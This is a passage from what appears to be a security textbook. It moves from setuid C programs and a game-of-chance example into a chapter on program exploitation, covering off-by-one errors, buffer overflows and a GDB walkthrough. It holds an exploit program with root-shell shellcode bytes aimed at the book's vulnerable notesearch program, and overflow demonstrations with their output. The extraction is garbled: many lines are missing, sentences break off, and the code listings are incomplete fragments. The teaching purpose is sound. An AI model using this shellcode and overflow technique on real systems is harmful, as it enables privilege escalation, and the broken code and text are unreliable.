root root 9015 2007-09-07 05:48 ./notetaker\nreader@hacking:~/booksrc $ ./notetaker \"this is a test of multiuser notes\"\n[DEBUG] buffer   @ 0x804a008: 'this is a test of multiuser notes'\n-rw------- 1 root reader 39 2007-09-07 05:49 /var/notes\nIn the preceding output, the notetaker program is compiled and changed\nto be owned by root, and the setuid permission is set. Now when the program\nis executed, the program runs as the root user, so the file /var/notes is also\nreader@hacking:~/booksrc $ sudo hexdump -C /var/notes\n00000000  e7 03 00 00 0a 74 68 69  73 20 69 73 20 61 20 74  |.....this is a t|\n00000010  65 73 74 20 6f 66 20 6d  75 6c 74 69 75 73 65 72  |est of multiuser|\n00000020  20 6e 6f 74 65 73 0a                              | notes.|\nThe /var/notes file contains the user ID of reader (999) and the note.\nBecause of little-endian architecture, the 4 bytes of the integer 999 appear\nIn order for a normal user to be able to read the note data, a correspond-\ning setuid root program is needed. The notesearch.c program will read the\nnote data and only display the notes written by that user ID. Additionally, an\noptional command-line argument can be supplied for a search string. When\nthis is used, only notes matching the search string will be displayed.\nint print_notes(int, int, char *);   // Note printing function.\nint find_user_note(int, int);        // Seek in file for a note for user.\nint search_note(char *, char *);     // Search for keyword function.\nvoid fatal(char *);                  // Fatal error handler\nif(argc > 1)                        // If there is an arg,\nstrcpy(searchstring, argv[1]);   //   that is the search string;\nsearchstring[0] = 0;             //   search string is empty.\nfd = open(FILENAME, O_RDONLY);   // Open the file for read-only access.\n// A function to print the notes for a given uid that match\n// returns 0 at end of file, 1 if there are still more notes.\nint print_notes(int fd, int uid, char *searchstring) {\nread(fd, note_buffer, note_length); // Read note data.\nnote_buffer[note_length] = 0;       // Terminate the string.\nif(search_note(note_buffer, searchstring)) // If searchstring found,\nprintf(note_buffer);                    //   print the note.\n// A function to find the next note for a given userID;\n// otherwise, it returns the length of the found note.\nwhile(note_uid != user_uid) {  // Loop until a note for user_uid is found.\nif(read(fd, &note_uid, 4) != 4) // Read the uid data.\nreturn -1; // If 4 bytes aren't read, return end of file code.\nif(read(fd, &byte, 1) != 1) // Read the newline separator.\nwhile(byte != '\\n') {  // Figure out how many bytes to the end of line.\nreturn -1;     // If byte isn't read, return end of file code.\nlseek(fd, length * -1, SEEK_CUR); // Rewind file reading by length bytes.\nprintf(\"[DEBUG] found a %d byte note for user id %d\\n\", length, note_uid);\n// A function to search a note for a given keyword;\n// returns 1 if a match is found, 0 if there is no match.\nif(keyword_length == 0)  // If there is no search string,\nfor(i=0; i < strlen(note); i++) { // Iterate over bytes in note.\nif(note[i] == keyword[match])  // If byte matches keyword,\nif(note[i] == keyword[0]) // if that byte matches first keyword byte,\nif(match == keyword_length) // If there is a full match,\nMost of this code should make sense, but there are some new concepts.\nThe filename is defined at the top instead of using heap memory. Also, the\nfunction lseek() is used to rewind the read position in the file. The function\ncall of lseek(fd, length * -1, SEEK_CUR); tells the program to move the read\nposition forward from the current position in the file by length * -1 bytes.\nSince this turns out to be a negative number, the position is moved backward\nreader@hacking:~/booksrc $ gcc -o notesearch notesearch.c\nreader@hacking:~/booksrc $ sudo chown root:root ./notesearch\nreader@hacking:~/booksrc $ sudo chmod u+s ./notesearch\nWhen compiled and setuid root, the notesearch program works as\nexpected. But this is just a single user; what happens if a different user uses\njose@hacking:/home/reader/booksrc $ ./notetaker \"This is a note for jose\"\n[DEBUG] buffer   @ 0x804a008: 'This is a note for jose'\nWhen the user jose uses these programs, the real user ID is 501. This\nmeans that value is added to all notes written with notetaker, and only notes\nwith a matching user ID will be displayed by the notesearch program.\nreader@hacking:~/booksrc $ ./notetaker \"This is another note for the reader user\"\n[DEBUG] buffer   @ 0x804a008: 'This is another note for the reader user'\nSimilarly, all notes for the user reader have the user ID 999 attached to\nthem. Even though both the notetaker and notesearch programs are suid\nroot and have full read and write access to the /var/notes datafile, the pro-\ngram logic in the notesearch program prevents the current user from view-\ning other users\u2019 notes. This is very similar to how the /etc/passwd file stores\nuser information for all users, yet programs like chsh and passwd allow any user\nSometimes there are multiple variables that should be grouped together and\ntreated like one. In C, structs are variables that can contain many other vari-\nables. Structs are often used by various system functions and libraries, so\nunderstanding how to use structs is a prerequisite to using these functions.\nA simple example will suffice for now. When dealing with many time functions,\nthese functions use a time struct called tm, which is defined in /usr/include/\nAfter this struct is defined, struct tm becomes a usable variable type, which\ncan be used to declare variables and pointers with the data type of the tm struct.\nThe time_example.c program demonstrates this. When time.h is included,\nthe tm struct is defined, which is later used to declare the current_time and\nseconds_since_epoch = time(0); // Pass time a null pointer as argument.\nprintf(\"time() - seconds since epoch: %ld\\n\", seconds_since_epoch);\ntime_ptr = &current_time;  // Set time_ptr to the address of\nminute = time_ptr->tm_min;    // Access via pointer\nsecond = *((int *) time_ptr); // Hacky pointer access\nprintf(\"Current time is: %02d:%02d:%02d\\n\", hour, minute, second);\nThe time() function will return the number of seconds since January 1,\n1970. Time on Unix systems is kept relative to this rather arbitrary point in\ntime, which is also known as the epoch. The localtime_r() function expects two\npointers as arguments: one to the number of seconds since epoch and the\nother to a tm struct. The pointer time_ptr has already been set to the address\nof current_time, an empty tm struct. The address-of operator is used to provide\na pointer to seconds_since_epoch for the other argument to localtime_r(), which\nfills the elements of the tm struct. The elements of structs can be accessed in\nthree different ways; the first two are the proper ways to access struct elements,\nand the third is a hacked solution. If a struct variable is used, its elements can\nbe accessed by adding the elements\u2019 names to the end of the variable name\nwith a period. Therefore, current_time.tm_hour will access just the tm_hour\nelement of the tm struct called current_time. Pointers to structs are often used,\nsince it is much more efficient to pass a four-byte pointer than an entire data\nstructure. Struct pointers are so common that C has a built-in method to\naccess struct elements from a struct pointer without needing to dereference\nthe pointer. When using a struct pointer like time_ptr, struct elements can be\nsimilarly accessed by the struct element\u2019s name, but using a series of charac-\nters that looks like an arrow pointing right. Therefore, time_ptr->tm_min will\naccess the tm_min element of the tm struct that is pointed to by time_ptr. The\nseconds could be accessed via either of these proper methods, using the\ntm_sec element or the tm struct, but a third method is used. Can you figure\nThe program works as expected, but how are the seconds being accessed\nin the tm struct? Remember that in the end, it\u2019s all just memory. Since tm_sec is\ndefined at the beginning of the tm struct, that integer value is also found at\nthe beginning. In the line second = *((int *) time_ptr), the variable time_ptr\nis typecast from a tm struct pointer to an integer pointer. Then this typecast\npointer is dereferenced, returning the data at the pointer\u2019s address. Since\nthe address to the tm struct also points to the first element of this struct, this\nwill retrieve the integer value for tm_sec in the struct. The following addition\nto the time_example.c code (time_example2.c) also dumps the bytes of the\ncurrent_time. This shows that the elements of tm struct are right next to each\nother in memory. The elements further down in the struct can also be directly\naccessed with pointers by simply adding to the address of the pointer.\nvoid dump_time_struct_bytes(struct tm *time_ptr, int size) {\nprintf(\"bytes of struct located at 0x%08x\\n\", time_ptr);\nseconds_since_epoch = time(0); // Pass time a null pointer as argument.\nprintf(\"time() - seconds since epoch: %ld\\n\", seconds_since_epoch);\ntime_ptr = &current_time;  // Set time_ptr to the address of\nminute = time_ptr->tm_min;    // Access via pointer\nsecond = *((int *) time_ptr); // Hacky pointer access\nprintf(\"Current time is: %02d:%02d:%02d\\n\", hour, minute, second);\ndump_time_struct_bytes(time_ptr, sizeof(struct tm));\nprintf(\"int_ptr @ 0x%08x : %d\\n\", int_ptr, *int_ptr);\nint_ptr++; // Adding 1 to int_ptr adds 4 to the address,\nThe results of compiling and executing time_example2.c are as follows.\nWhile struct memory can be accessed this way, assumptions are made\nabout the type of variables in the struct and the lack of any padding between\nvariables. Since the data types of a struct\u2019s elements are also stored in the\nstruct, using proper methods to access struct elements is much easier.\nA pointer simply contains a memory address and is given a data type that\ndescribes where it points. Usually, pointers are used for variables; however,\nthey can also be used for functions. The funcptr_example.c program\nIn this program, a function pointer aptly named function_ptr is declared\nin main(). This pointer is then set to point at the function func_one() and is\ncalled; then it is set again and used to call func_two(). The output below shows\nSince computers are deterministic machines, it is impossible for them to\nproduce truly random numbers. But many applications require some form of\nrandomness. The pseudo-random number generator functions fill this need\nby generating a stream of numbers that is pseudo-random. These functions\ncan produce a seemingly random sequence of numbers started from a seed\nnumber; however, the same exact sequence can be generated again with the\nsame seed. Deterministic machines cannot produce true randomness, but if\nthe seed value of the pseudo-random generation function isn\u2019t known, the\nsequence will seem random. The generator must be seeded with a value\nusing the function srand(), and from that point on, the function rand() will\nreturn a pseudo-random number from 0 to RAND_MAX. These functions and\nRAND_MAX are defined in stdlib.h. While the numbers rand() returns will appear\nto be random, they are dependent on the seed value provided to srand().\nTo maintain pseudo-randomness between subsequent program executions,\nthe randomizer must be seeded with a different value each time. One common\npractice is to use the number of seconds since epoch (returned from the time()\nfunction) as the seed. The rand_example.c program demonstrates this\nNotice how the modulus operator is used to obtain random values from\nThe program\u2019s output just displays random numbers. Pseudo-randomness\ncan also be used for more complex programs, as you will see in this section\u2019s\nThe final program in this section is a set of games of chance that use many\nof the concepts we\u2019ve discussed. The program uses pseudo-random number\ngenerator functions to provide the element of chance. It has three different\ngame functions, which are called using a single global function pointer, and\nit uses structs to hold data for the player, which is saved in a file. Multi-user file\npermissions and user IDs allow multiple users to play and maintain their own\naccount data. The game_of_chance.c program code is heavily documented,\nand you should be able to understand it at this point.\n#define DATAFILE \"/var/chance.data\" // File to store user data\n// Custom user struct to store information about users\nsrand(time(0)); // Seed the randomizer with the current time.\nif(get_player_data() == -1) // Try to read player data from file.\nregister_new_player();    // If there is no data, register a new player.\nprintf(\"[You have %u credits] ->  \", player.credits);\nprintf(\"\\n[!!] The number %d is an invalid selection.\\n\\n\", choice);\nif(choice != last_game) { // If the function ptr isn't set\nif(choice == 1)        // then point it at the selected game\nprintf(\"\\nYour account has been reset with 100 credits.\\n\\n\");\n// This function reads the player data for the current uid\n// from the file. It returns -1 if it is unable to find player\nif(fd == -1) // Can't open the file, maybe it doesn't exist\nread_bytes = read(fd, &entry, sizeof(struct user));\nwhile(entry.uid != uid && read_bytes > 0) { // Loop until proper uid is found.\nread_bytes = read(fd, &entry, sizeof(struct user)); // Keep reading.\nif(read_bytes  < sizeof(struct user)) // This means that the end of file was reached.\nplayer = entry; // Copy the read entry into the player struct.\n// It will create a new player account and append it to the file.\nfd = open(DATAFILE, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);\nfatal(\"in register_new_player() while opening file\");\nprintf(\"\\nWelcome to the Game of Chance %s.\\n\", player.name);\nprintf(\"You have been given %u credits.\\n\", player.credits);\n// This function writes the current player data to the file.\n// It is used primarily for updating the credits after games.\nif(fd == -1) // If open fails here, something is really wrong.\nfatal(\"in update_player_data() while opening file\");\nwhile(read_uid != player.uid) {  // Loop until correct uid is found.\nfor(i=0; i < sizeof(struct user) - 4; i++)  // Read through the\nwrite(fd, &(player.credits), 4);   // Update credits.\nwrite(fd, &(player.highscore), 4); // Update highscore.\n// This function will display the current high score and\nprintf(\"\\n====================| HIGH SCORE |====================\\n\");\nwhile(read(fd, &entry, sizeof(struct user)) > 0) { // Loop until end of file.\nif(entry.highscore > top_score) {   // If there is a higher score,\ntop_score = entry.highscore;  // set top_score to that score\nstrcpy(top_name, entry.name); // and top_name to that username.\nprintf(\"%s has the high score of %u\\n\", top_name, top_score);\nprintf(\"You currently have the high score of %u credits!\\n\", player.highscore);\nprintf(\"======================================================\\n\\n\");\n// This function simply awards the jackpot for the Pick a Number game.\nprintf(\"You have won the jackpot of 100 credits!\\n\");\n// This function is used to input the player name, since\n// scanf(\"%s\", &whatever) will stop input at the first space.\nname_ptr = (char *) &(player.name); // name_ptr = player name's address\nwhile(input_char != '\\n') {  // Loop until newline.\n*name_ptr = input_char;   // Put the input char into name field.\nname_ptr++;               // Increment the name pointer.\n// This function prints the 3 cards for the Find the Ace game.\n// It expects a message to display, a pointer to the cards array,\n// and the card the user has picked as input. If the user_pick is\nvoid print_cards(char *message, char *cards, int user_pick) {\nprintf(\"Cards:\\t|%c|\\t|%c|\\t|%c|\\n\\t\", cards[0], cards[1], cards[2]);\n// This function inputs wagers for both the No Match Dealer and\n// Find the Ace games. It expects the available credits and the\n// previous wager as arguments. The previous_wager is only important\n// for the second wager in the Find the Ace game. The function\n// returns -1 if the wager is too big or too little, and it returns\nint take_wager(int available_credits, int previous_wager) {\nprintf(\"How many of your %d credits would you like to wager?  \", available_credits);\nif(wager < 1) {   // Make sure the wager is greater than 0.\nprintf(\"Nice try, but you must wager a positive number!\\n\");\nif(total_wager > available_credits) {  // Confirm available credits\nprintf(\"Your total wager of %d is more than you have!\\n\", total_wager);\nprintf(\"You only have %d available credits, try again.\\n\", available_credits);\n// This function contains a loop to allow the current game to be\n// played again. It also writes the new credit totals to file\nprintf(\"\\n[DEBUG] current_game pointer @ 0x%08x\\n\", player.current_game);\nif(player.credits > player.highscore)  // a new high score is set,\nplayer.highscore = player.credits;  // update the highscore.\nprintf(\"\\nYou now have %u credits\\n\", player.credits);\n// It returns -1 if the player doesn't have enough credits.\nprintf(\"This game costs 10 credits to play. Simply pick a number\\n\");\nprintf(\"between 1 and 20, and if you pick the winning number, you\\n\");\nprintf(\"will win the jackpot of 100 credits!\\n\\n\");\nwinning_number = (rand() % 20) + 1; // Pick a number between 1 and 20.\nprintf(\"You only have %d credits. That's not enough to play!\\n\\n\", player.credits);\nprintf(\"10 credits have been deducted from your account.\\n\");\nprintf(\"The winning number is %d\\n\", winning_number);\nprintf(\"In this game, you can wager up to all of your credits.\\n\");\nprintf(\"The dealer will deal out 16 random numbers between 0 and 99.\\n\");\nprintf(\"If there are no matches among them, you double your money!\\n\\n\");\nprintf(\"You don't have any credits to wager!\\n\\n\");\nprintf(\"\\t\\t::: Dealing out 16 random numbers :::\\n\");\nnumbers[i] = rand() % 100; // Pick a number between 0 and 99.\nprintf(\"The dealer matched the number %d!\\n\", match);\nprintf(\"There were no matches! You win %d credits!\\n\", wager);\nint invalid_choice, pick = -1, wager_one = -1, wager_two = -1;\nprintf(\"In this game, you can wager up to all of your credits.\\n\");\nprintf(\"Three cards will be dealt out, two queens and one ace.\\n\");\nprintf(\"If you find the ace, you will win your wager.\\n\");\nprintf(\"After choosing a card, one of the queens will be revealed.\\n\");\nprintf(\"At this point, you may either select a different card or\\n\");\nprintf(\"You don't have any credits to wager!\\n\\n\");\nwhile(wager_one == -1) // Loop until valid wager is made.\nwhile((pick < 1) || (pick > 3)) { // Loop until valid pick is made.\npick--; // Adjust the pick since card numbering starts at 0.\ni++;                      // we find a valid queen to reveal.\nprintf(\"Would you like to:\\n[c]hange your pick\\tor\\t[i]ncrease your wager?\\n\");\nwhile(wager_two == -1)  // Loop until valid second wager is made.\nwhile(i == pick || cards[i] == 'Q') // Loop until the other card\nprintf(\"Your card pick has been changed to card %d\\n\", pick+1);\nfor(i=0; i < 3; i++) {  // Reveal all of the cards.\nprintf(\"You have won %d credits from your first wager\\n\", wager_one);\nprintf(\"and an additional %d credits from your second wager!\\n\", wager_two);\nprintf(\"You have lost %d credits from your first wager\\n\", wager_one);\nprintf(\"and an additional %d credits from your second wager!\\n\", wager_two);\nSince this is a multi-user program that writes to a file in the /var dir-\nreader@hacking:~/booksrc $ gcc -o game_of_chance game_of_chance.c\nreader@hacking:~/booksrc $ sudo chown root:root ./game_of_chance\nreader@hacking:~/booksrc $ sudo chmod u+s ./game_of_chance\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nIn this game you can wager up to all of your credits.\nThe dealer will deal out 16 random numbers between 0 and 99.\nIf there are no matches among them, you double your money!\nHow many of your 90 credits would you like to wager?  30\n88      68      82      51      21      73      80      50\n11      64      78      85      39      42      40      95\nIn this game you can wager up to all of your credits.\nAfter choosing a card, one of the queens will be revealed.\nAt this point you may either select a different card or\nHow many of your 120 credits would you like to wager?  50\n[c]hange your pick      or      [i]ncrease your wager?\n====================| HIGH SCORE |====================\n======================================================\njose@hacking:/home/reader/booksrc $ ./game_of_chance\n4 - View current high score 5 - Change your username\n====================| HIGH SCORE |====================\n======================================================\nPlay around with this program a little bit. The Find the Ace game is a\ndemonstration of a principle of conditional probability; although it is counter-\nintuitive, changing your pick will increase your chances of finding the ace\nfrom 33 percent to 50 percent. Many people have difficulty understanding\nthis truth\u2014that\u2019s why it\u2019s counterintuitive. The secret of hacking is under-\nstanding little-known truths like this and using them to produce seemingly\nProgram exploitation is a staple of hacking. As demon-\nstrated in the previous chapter, a program is made up\nof a complex set of rules following a certain execution\nflow that ultimately tells the computer what to do.\nExploiting a program is simply a clever way of getting\nthe computer to do what you want it to do, even if the\ncurrently running program was designed to prevent that action. Since a\nprogram can really only do what it\u2019s designed to do, the security holes are\nactually flaws or oversights in the design of the program or the environment\nthe program is running in. It takes a creative mind to find these holes and\nto write programs that compensate for them. Sometimes these holes are\nthe products of relatively obvious programmer errors, but there are some\nless obvious errors that have given birth to more complex exploit techniques\nA program can only do what it\u2019s programmed to do, to the letter of the law.\nUnfortunately, what\u2019s written doesn\u2019t always coincide with what the program-\nmer intended the program to do. This principle can be explained with a joke:\nA man is walking through the woods, and he finds a magic lamp on\nthe ground. Instinctively, he picks the lamp up, rubs the side of it\nwith his sleeve, and out pops a genie. The genie thanks the man for\nfreeing him, and offers to grant him three wishes. The man is ecstatic\nThe genie snaps his fingers and a briefcase full of money\nThe man is wide eyed in amazement and continues, \u201cNext, I want\nThe genie snaps his fingers and a Ferrari appears from a puff\nThe man continues, \u201cFinally, I want to be irresistible to women.\u201d\nThe genie snaps his fingers and the man turns into a box\nJust as the man\u2019s final wish was granted based on what he said, rather\nthan what he was thinking, a program will follow its instructions exactly, and\nthe results aren\u2019t always what the programmer intended. Sometimes the\nProgrammers are human, and sometimes what they write isn\u2019t exactly\nwhat they mean. For example, one common programming error is called an\noff-by-one error. As the name implies, it\u2019s an error where the programmer has\nmiscounted by one. This happens more often than you might think, and it is\nbest illustrated with a question: If you\u2019re building a 100-foot fence, with fence\nposts spaced 10 feet apart, how many fence posts do you need? The obvious\nanswer is 10 fence posts, but this is incorrect, since you actually need 11. This\ntype of off-by-one error is commonly called a fencepost error, and it occurs when a\nprogrammer mistakenly counts items instead of spaces between items, or\nvice versa. Another example is when a programmer is trying to select a range of\nnumbers or items for processing, such as items N through M. If N = 5 and M = 17,\nhow many items are there to process? The obvious answer is M - N, or 17 - 5 = 12\nitems. But this is incorrect, since there are actually M - N + 1 items, for a total\nof 13 items. This may seem counterintuitive at first glance, because it is, and\nOften, fencepost errors go unnoticed because programs aren\u2019t tested for\nevery single possibility, and the effects of a fencepost error don\u2019t generally\noccur during normal program execution. However, when the program is fed\nthe input that makes the effects of the error manifest, the consequences of the\nerror can have an avalanche effect on the rest of the program logic. When\nproperly exploited, an off-by-one error can cause a seemingly secure program\nOne classic example of this is OpenSSH, which is meant to be a secure\nterminal communication program suite, designed to replace insecure and\nunencrypted services such as telnet, rsh, and rcp. However, there was an off-\nby-one error in the channel-allocation code that was heavily exploited. Specific-\nIn plain English, the code reads If the ID is less than 0 or the ID is greater\nthan the channels allocated, do the following stuff, when it should have been If the\nID is less than 0 or the ID is greater than or equal to the channels allocated, do the\nThis simple off-by-one error allowed further exploitation of the pro-\ngram, so that a normal user authenticating and logging in could gain full\nadministrative rights to the system. This type of functionality certainly wasn\u2019t\nwhat the programmers had intended for a secure program like OpenSSH,\nAnother situation that seems to breed exploitable programmer errors is\nwhen a program is quickly modified to expand its functionality. While this\nincrease in functionality makes the program more marketable and increases\nits value, it also increases the program\u2019s complexity, which increases the\nchances of an oversight. Microsoft\u2019s IIS webserver program is designed to\nserve static and interactive web content to users. In order to accomplish this,\nthe program must allow users to read, write, and execute programs and files\nwithin certain directories; however, this functionality must be limited to those\nparticular directories. Without this limitation, users would have full control of\nthe system, which is obviously undesirable from a security perspective. To\nprevent this situation, the program has path-checking code designed to\nprevent users from using the backslash character to traverse backward through\nWith the addition of support for the Unicode character set, though, the\ncomplexity of the program continued to increase. Unicode is a double-byte\ncharacter set designed to provide characters for every language, including\nChinese and Arabic. By using two bytes for each character instead of just one,\nUnicode allows for tens of thousands of possible characters, as opposed to\nthe few hundred allowed by single-byte characters. This additional complexity\nmeans that there are now multiple representations of the backslash charac-\nter. For example, %5c in Unicode translates to the backslash character, but\nthis translation was done after the path-checking code had run. So by using\n%5c instead of \\, it was indeed possible to traverse directories, allowing\nthe aforementioned security dangers. Both the Sadmind worm and the\nCodeRed worm used this type of Unicode conversion oversight to deface\nA related example of this letter-of-the-law principle used outside the\nrealm of computer programming is the LaMacchia Loophole. Just like the\nrules of a computer program, the US legal system sometimes has rules that\ndon\u2019t say exactly what their creators intended, and like a computer program\nexploit, these legal loopholes can be used to sidestep the intent of the law.\nNear the end of 1993, a 21-year-old computer hacker and student at MIT\nnamed David LaMacchia set up a bulletin board system called Cynosure for\nthe purposes of software piracy. Those who had software to give would upload\nit, and those who wanted software would download it. The service was only\nonline for about six weeks, but it generated heavy network traffic worldwide,\nwhich eventually attracted the attention of university and federal authorities.\nSoftware companies claimed that they lost one million dollars as a result of\nCynosure, and a federal grand jury charged LaMacchia with one count of\nconspiring with unknown persons to violate the wire fraud statue. However,\nthe charge was dismissed because what LaMacchia was alleged to have done\nwasn\u2019t criminal conduct under the Copyright Act, since the infringement\nwas not for the purpose of commercial advantage or private financial gain.\nApparently, the lawmakers had never anticipated that someone might engage\nin these types of activities with a motive other than personal financial gain.\n(Congress closed this loophole in 1997 with the No Electronic Theft Act.)\nEven though this example doesn\u2019t involve the exploiting of a computer\nprogram, the judges and courts can be thought of as computers executing\nthe program of the legal system as it was written. The abstract concepts of\nhacking transcend computing and can be applied to many other aspects\nOff-by-one errors and improper Unicode expansion are all mistakes that can\nbe hard to see at the time but are glaringly obvious to any programmer in\nhindsight. However, there are some common mistakes that can be exploited\nin ways that aren\u2019t so obvious. The impact of these mistakes on security isn\u2019t\nalways apparent, and these security problems are found in code everywhere.\nBecause the same type of mistake is made in many different places, general-\nized exploit techniques have evolved to take advantage of these mistakes, and\nMost program exploits have to do with memory corruption. These include\ncommon exploit techniques like buffer overflows as well as less-common\nmethods like format string exploits. With these techniques, the ultimate goal\nis to take control of the target program\u2019s execution flow by tricking it into\nrunning a piece of malicious code that has been smuggled into memory.\nThis type of process hijacking is known as execution of arbitrary code, since the\nhacker can cause a program to do pretty much anything he or she wants it to.\nLike the LaMacchia Loophole, these types of vulnerabilities exist because\nthere are specific unexpected cases that the program can\u2019t handle. Under\nnormal conditions, these unexpected cases cause the program to crash\u2014\nmetaphorically driving the execution flow off a cliff. But if the environment\nis carefully controlled, the execution flow can be controlled\u2014preventing the\nBuffer overflow vulnerabilities have been around since the early days of com-\nputers and still exist today. Most Internet worms use buffer overflow vulner-\nabilities to propagate, and even the most recent zero-day VML vulnerability\nC is a high-level programming language, but it assumes that the\nprogrammer is responsible for data integrity. If this responsibility were\nshifted over to the compiler, the resulting binaries would be significantly\nslower, due to integrity checks on every variable. Also, this would remove a\nsignificant level of control from the programmer and complicate the\nWhile C\u2019s simplicity increases the programmer\u2019s control and the efficiency\nof the resulting programs, it can also result in programs that are vulnerable\nto buffer overflows and memory leaks if the programmer isn\u2019t careful. This\nmeans that once a variable is allocated memory, there are no built-in safe-\nguards to ensure that the contents of a variable fit into the allocated memory\nspace. If a programmer wants to put ten bytes of data into a buffer that had\nonly been allocated eight bytes of space, that type of action is allowed, even\nthough it will most likely cause the program to crash. This is known as a\nbuffer overrun or buffer overflow, since the extra two bytes of data will overflow\nand spill out of the allocated memory, overwriting whatever happens to\ncome next. If a critical piece of data is overwritten, the program will crash.\nstrcpy(buffer_one, \"one\"); /* Put \"one\" into buffer_one. */\nstrcpy(buffer_two, \"two\"); /* Put \"two\" into buffer_two. */\nprintf(\"[BEFORE] buffer_two is at %p and contains \\'%s\\'\\n\", buffer_two, buffer_two);\nprintf(\"[BEFORE] buffer_one is at %p and contains \\'%s\\'\\n\", buffer_one, buffer_one);\nprintf(\"[BEFORE] value is at %p and is %d (0x%08x)\\n\", &value, value, value);\nprintf(\"\\n[STRCPY] copying %d bytes into buffer_two\\n\\n\",  strlen(argv[1]));\nstrcpy(buffer_two, argv[1]); /* Copy first argument into buffer_two. */\nprintf(\"[AFTER] buffer_two is at %p and contains \\'%s\\'\\n\", buffer_two, buffer_two);\nprintf(\"[AFTER] buffer_one is at %p and contains \\'%s\\'\\n\", buffer_one, buffer_one);\nprintf(\"[AFTER] value is at %p and is %d (0x%08x)\\n\", &value, value, value);\nBy now, you should be able to read the source code above and figure out\nwhat the program does. After compilation in the sample output below, we try\nto copy ten bytes from the first command-line argument into buffer_two, which\nreader@hacking:~/booksrc $ gcc -o overflow_example overflow_example.c\nreader@hacking:~/booksrc $ ./overflow_example 1234567890\n[BEFORE] buffer_two is at 0xbffff7f0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7f8 and contains 'one'\n[BEFORE] value is at 0xbffff804 and is 5 (0x00000005)\n[AFTER] buffer_two is at 0xbffff7f0 and contains '1234567890'\n[AFTER] buffer_one is at 0xbffff7f8 and contains '90'\n[AFTER] value is at 0xbffff804 and is 5 (0x00000005)\nNotice that buffer_one is located directly after buffer_two in memory, so\nwhen ten bytes are copied into buffer_two, the last two bytes of 90 overflow\nA larger buffer will naturally overflow into the other variables, but if a large\nenough buffer is used, the program will crash and die.\nreader@hacking:~/booksrc $ ./overflow_example AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'\n[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)\n[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAA'\n[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)\nThese types of program crashes are fairly common\u2014think of all of the\ntimes a program has crashed or blue-screened on you. The programmer\u2019s\nmistake is one of omission\u2014there should be a length check or restriction on\nthe user-supplied input. These kinds of mistakes are easy to make and can be\ndifficult to spot. In fact, the notesearch.c program on page 93 contains a buffer\noverflow bug. You might not have noticed this until right now, even if you\nreader@hacking:~/booksrc $ ./notesearch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nProgram crashes are annoying, but in the hands of a hacker they can\nbecome downright dangerous. A knowledgeable hacker can take control of a\nprogram as it crashes, with some surprising results. The exploit_notesearch.c\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\nstrcpy(command, \"./notesearch \\'\"); // Start command buffer.\nbuffer = command + strlen(command); // Set buffer at the end.\nret = (unsigned int) &i - offset; // Set return address.\nfor(i=0; i < 160; i+=4) // Fill buffer with return address.\nThis exploit\u2019s source code will be explained in depth later, but in general,\nit\u2019s just generating a command string that will execute the notesearch pro-\ngram with a command-line argument between single quotes. It uses string\nfunctions to do this: strlen() to get the current length of the string (to position\nthe buffer pointer) and strcat() to concatenate the closing single quote to the\nend. Finally, the system function is used to execute the command string.\nThe buffer that is generated between the single quotes is the real meat of the\nexploit. The rest is just a delivery method for this poison pill of data. Watch\nreader@hacking:~/booksrc $ gcc exploit_notesearch.c\nThe exploit is able to use the overflow to serve up a root shell\u2014providing\nfull control over the computer. This is an example of a stack-based buffer\nThe notesearch exploit works by corrupting memory to control execution\nflow. The auth_overflow.c program demonstrates this concept.\nThis example program accepts a password as its only command-line\nargument and then calls a check_authentication() function. This function\nallows two passwords, meant to be representative of multiple authentication\nmethods. If either of these passwords is used, the function returns 1, which\ngrants access. You should be able to figure most of that out just by looking at\nthe source code before compiling it. Use the -g option when you do compile\nreader@hacking:~/booksrc $ gcc -g -o auth_overflow auth_overflow.c\nreader@hacking:~/booksrc $ ./auth_overflow outgrabe\nSo far, everything works as the source code says it should. This is to be\nexpected from something as deterministic as a computer program. But an\noverflow can lead to unexpected and even contradictory behavior, allowing\nreader@hacking:~/booksrc $ ./auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nYou may have already figured out what happened, but let\u2019s look at this\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n11              if(strcmp(password_buffer, \"brillig\") == 0)\n13              if(strcmp(password_buffer, \"outgrabe\") == 0)\nBreakpoint 1 at 0x8048421: file auth_overflow.c, line 9.\nBreakpoint 2 at 0x804846f: file auth_overflow.c, line 16.\nThe GDB debugger is started with the -q option to suppress the welcome\nbanner, and breakpoints are set on lines 9 and 16. When the program is run,\nexecution will pause at these breakpoints and give us a chance to examine\nStarting program: /home/reader/booksrc/auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nBreakpoint 1, check_authentication (password=0xbffff9af 'A' <repeats 30 times>) at\n0xbffff7a0:      \")????o??????)\\205\\004\\b?o??p???????\"\n0xbffff7a0:     0xb7f9f729      0xb7fd6ff4      0xbffff7d8      0x08048529\n0xbffff7b0:     0xb7fd6ff4      0xbffff870      0xbffff7d8      0x00000000\n0xbffff7c0:     0xb7ff47b0      0x08048510      0xbffff7d8      0x080484bb\n0xbffff7d0:     0xbffff9af      0x08048510      0xbffff838      0xb7eafebc\nThe first breakpoint is before the strcpy() happens. By examining\nthe password_buffer pointer, the debugger shows it is filled with random\nuninitialized data and is located at 0xbffff7a0 in memory. By examining the\naddress of the auth_flag variable, we can see both its location at 0xbffff7bc\nand its value of 0. The print command can be used to do arithmetic and shows\nthat auth_flag is 28 bytes past the start of password_buffer. This relationship\ncan also be seen in a block of memory starting at password_buffer. The loca-\nBreakpoint 2, check_authentication 